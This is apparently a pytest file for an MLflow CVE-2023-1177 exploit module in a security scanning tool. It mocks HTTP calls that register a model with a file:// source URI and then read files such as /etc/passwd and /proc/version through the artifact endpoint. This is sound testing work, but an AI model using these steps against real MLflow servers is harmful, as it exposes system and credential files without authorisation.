"""Tests for flowhound.vulnerabilities.auxiliary.mlflow.cve_2023_1177."""

from unittest.mock import MagicMock, patch

from flowhound.vulnerabilities.auxiliary.mlflow.cve_2023_1177 import Auxiliary

_BASE_URL = "http://localhost:5000"


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _make_response(status: int, text: str) -> MagicMock:
    r = MagicMock()
    r.status_code = status
    r.text = text
    return r


# ---------------------------------------------------------------------------
# trigger_vuln
# ---------------------------------------------------------------------------


class TestTriggerVuln:
    def test_returns_file_content_on_success(self):
        """All three steps succeed — returns (200, file_content)."""
        ok = _make_response(200, "")
        file_resp = _make_response(200, "root:x:0:0:root:/root:/bin/bash\n")

        exploit = Auxiliary()
        with (
            patch("requests.post", return_value=ok),
            patch("requests.get", return_value=file_resp),
        ):
            result = exploit.trigger_vuln(
                base_url=_BASE_URL,
                model_name="test-model",
                file_dir="/etc",
                filename="passwd",
            )

        assert result == (200, "root:x:0:0:root:/root:/bin/bash\n")

    def test_source_uri_uses_file_scheme(self):
        """The model-version create POST uses a file:// source URI."""
        ok = _make_response(200, "")
        file_resp = _make_response(200, "content")

        exploit = Auxiliary()
        post_calls = []
        with (
            patch(
                "requests.post",
                side_effect=lambda *a, **kw: (post_calls.append(kw), ok)[1],
            ),
            patch("requests.get", return_value=file_resp),
        ):
            exploit.trigger_vuln(
                base_url=_BASE_URL,
                model_name="m",
                file_dir="/etc",
                filename="passwd",
            )

        # Second POST (model-version create) must have source = file:///etc/
        version_payload = post_calls[1]["json"]
        assert version_payload["source"] == "file:///etc/"

    def test_returns_early_on_model_create_failure(self):
        """If model creation fails, stops and returns the failure response."""
        fail = _make_response(403, '{"error": "forbidden"}')

        exploit = Auxiliary()
        with (
            patch("requests.post", return_value=fail),
            patch("requests.get") as mock_get,
        ):
            result = exploit.trigger_vuln(
                base_url=_BASE_URL,
                model_name="m",
                file_dir="/etc",
                filename="passwd",
            )

        assert result == (403, '{"error": "forbidden"}')
        mock_get.assert_not_called()

    def test_returns_none_on_network_error(self):
        """A network error on the first POST returns None."""
        exploit = Auxiliary()
        with patch("requests.post", side_effect=ConnectionError("refused")):
            result = exploit.trigger_vuln(
                base_url=_BASE_URL,
                model_name="m",
                file_dir="/etc",
                filename="passwd",
            )

        assert result is None


# ---------------------------------------------------------------------------
# run
# ---------------------------------------------------------------------------


class TestRun:
    def _setup_mocks(self, file_content: str, file_status: int = 200):
        ok = _make_response(200, "{}")
        file_resp = _make_response(file_status, file_content)
        return ok, file_resp

    def test_successful_exploit(self):
        ok, file_resp = self._setup_mocks("root:x:0:0:root:/root:/bin/bash\n")

        exploit = Auxiliary()
        with (
            patch("requests.post", return_value=ok),
            patch("requests.get", return_value=file_resp),
        ):
            result = exploit.run(base_url=_BASE_URL, username="", password="")

        assert result is True

    def test_default_path_is_etc_passwd(self):
        """When no f_path is given, /etc/passwd is targeted."""
        ok = _make_response(200, "{}")
        file_resp = _make_response(200, "root:x:0:0")

        get_calls = []
        exploit = Auxiliary()
        with (
            patch("requests.post", return_value=ok),
            patch(
                "requests.get",
                side_effect=lambda *a, **kw: (get_calls.append(kw), file_resp)[1],
            ),
        ):
            exploit.run(base_url=_BASE_URL, username="", password="")

        params = get_calls[0]["params"]
        assert params["path"] == "passwd"

    def test_custom_f_path_splits_correctly(self):
        """f_path='/proc/version' → file_dir='/proc', filename='version'."""
        ok = _make_response(200, "{}")
        file_resp = _make_response(200, "Linux version 5.15")

        get_calls = []
        post_calls = []
        exploit = Auxiliary()
        with (
            patch(
                "requests.post",
                side_effect=lambda *a, **kw: (post_calls.append(kw), ok)[1],
            ),
            patch(
                "requests.get",
                side_effect=lambda *a, **kw: (get_calls.append(kw), file_resp)[1],
            ),
        ):
            result = exploit.run(
                base_url=_BASE_URL,
                username="",
                password="",
                f_path="/proc/version",
            )

        assert result is True
        # source URI must point to /proc/
        version_payload = post_calls[1]["json"]
        assert version_payload["source"] == "file:///proc/"
        # artifact path must be 'version'
        assert get_calls[0]["params"]["path"] == "version"

    def test_mlflow_error_envelope_is_not_success(self):
        """A 200 response with '{}' (MLflow empty envelope) is treated as failure."""
        ok = _make_response(200, "{}")

        exploit = Auxiliary()
        with (
            patch("requests.post", return_value=ok),
            patch("requests.get", return_value=_make_response(200, "{}")),
        ):
            result = exploit.run(base_url=_BASE_URL, username="", password="")

        assert result is False

    def test_empty_body_is_success(self):
        """A 200 response with an empty body is a successful read (virtual/empty file)."""
        ok = _make_response(200, "{}")

        exploit = Auxiliary()
        with (
            patch("requests.post", return_value=ok),
            patch("requests.get", return_value=_make_response(200, "")),
        ):
            result = exploit.run(base_url=_BASE_URL, username="", password="")

        assert result is True

    def test_network_error_returns_false(self):
        """A network error on any step returns False without raising."""
        exploit = Auxiliary()
        with patch("requests.post", side_effect=ConnectionError("refused")):
            result = exploit.run(base_url=_BASE_URL, username="", password="")

        assert result is False

    def test_model_name_is_unique_per_call(self):
        """Each run() call generates a different model name."""
        ok = _make_response(200, "{}")
        file_resp = _make_response(200, "content")

        names = []

        def capture_post(*a, **kw):
            payload = kw.get("json", {})
            if "name" in payload and "source" not in payload:
                names.append(payload["name"])
            return ok

        exploit = Auxiliary()
        with (
            patch("requests.post", side_effect=capture_post),
            patch("requests.get", return_value=file_resp),
        ):
            exploit.run(base_url=_BASE_URL, username="", password="")
            exploit.run(base_url=_BASE_URL, username="", password="")

        assert len(names) == 2
        assert names[0] != names[1]
